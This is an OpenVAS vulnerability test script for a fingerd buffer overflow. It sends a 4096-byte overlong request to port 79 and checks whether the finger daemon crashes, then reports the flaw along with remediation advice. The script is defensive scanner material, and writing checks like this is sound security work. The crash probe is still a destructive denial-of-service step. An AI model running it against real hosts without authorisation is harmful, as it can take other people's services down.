# OpenVAS Vulnerability Test
# Description: fingerd buffer overflow
#
# Authors:
# Michel Arboi <mikhail@nessus.org>
#
# Copyright:
# Copyright (C) 2005 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.17141");
  script_version("2019-04-24T07:26:10+0000");
  script_tag(name:"last_modification", value:"2019-04-24 07:26:10 +0000 (Wed, 24 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_bugtraq_id(2);
  script_name("fingerd buffer overflow");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("This script is Copyright (C) 2005 Michel Arboi");
  script_family("Finger abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/finger", 79);

  script_tag(name:"solution", value:"Disable your finger daemon, apply the latest patches from your
  vendor, or a safer software.");

  script_tag(name:"summary", value:"The scanner was able to crash the remote finger daemon by sending a too long
  request.");

  script_tag(name:"impact", value:"This flaw is probably a buffer overflow and might be exploitable
  to run arbitrary code on this machine.");

  script_tag(name:"solution_type", value:"Mitigation");
  script_tag(name:"qod_type", value:"remote_banner_unreliable");

  exit(0);
}

include("misc_func.inc");

port = get_port_for_service( default:79, proto:"finger" );

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

send(socket:soc, data:crap(4096) + '\r\n');
r = recv(socket:soc, length:65535);
close(soc);

sleep(1);

soc = open_sock_tcp(port);
if(!soc){
  security_message(port:port);
  exit(0);
} else {
  close(soc);
}

if(!r) {
  report  = "The remote finger daemon abruptly closes the connection when it receives a too long request. It might be vulnerable to an exploitable buffer overflow. ";
  report += "Note that the scanner did not crash the service, so this might be a false positive. However, if the finger service is run through inetd (a very common configuration), ";
  report += "it is impossible to reliably test this kind of flaw.";
  security_message(port:port, data:report);
  exit(0);
}

exit(99);